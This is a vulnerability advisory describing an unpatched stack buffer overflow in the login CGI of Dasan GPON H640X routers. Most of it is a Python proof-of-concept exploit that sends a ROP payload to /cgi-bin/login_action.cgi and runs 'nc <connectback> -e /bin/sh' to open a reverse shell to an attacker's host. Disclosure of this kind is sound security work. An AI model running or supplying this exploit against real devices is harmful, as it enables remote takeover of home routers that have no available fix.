## Vulnerability Summary
The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146

Dasan Networks GPON ONT WiFi Router “is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It’s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.”

## Credit
An independent security researcher, TigerPuma (at) Fosec.vn, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

## Vendor response
We tried to contact Dasan since October 8 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.

## Vulnerability details
All cgi in Dasan web service are symbolic link of cgipage.cgi, and when client request, lighttpd will invoke the corresponding path.

The buffer overflow vulnerability found in function login_action which handler login request.

The function uses strcpy without check length of input from client request.

If we will look at the stack, we can see that we can trigger the buffer overflow and in the end to control the pc.

## Proof of Concept

```
import sys
import socket
import json
import time
import struct
import ssl

if len(sys.argv) != 4:
    print "Use: {} ip port connectback".format(sys.argv[0])
    sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

connectback = str(sys.argv[3])

buf = 1024
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.settimeout(10)

clientsocket = ssl.wrap_socket(sock)
#clientsocket = sock
clientsocket.connect((host, port))

addr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW

# rop1
rop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0
addr_rop1 = struct.pack(">i",rop1)
#rop2
system = addr_libc + 0x0003CC9C     #system
addr_system =  struct.pack(">i",system)

# execute command
command = "nc " + connectback + " -e /bin/sh;"

payload = "A"*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command

data = "action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n".format(payload)

http_payload = """POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}""".format(len(data),data)

print http_payload

clientsocket.send(http_payload)

respond_raw = clientsocket.recv(buf).strip()

print respond_raw

respond_raw = clientsocket.recv(buf).strip()

print respond_raw
respond_raw = clientsocket.recv(buf).strip()

print respond_raw

clientsocket.close()
```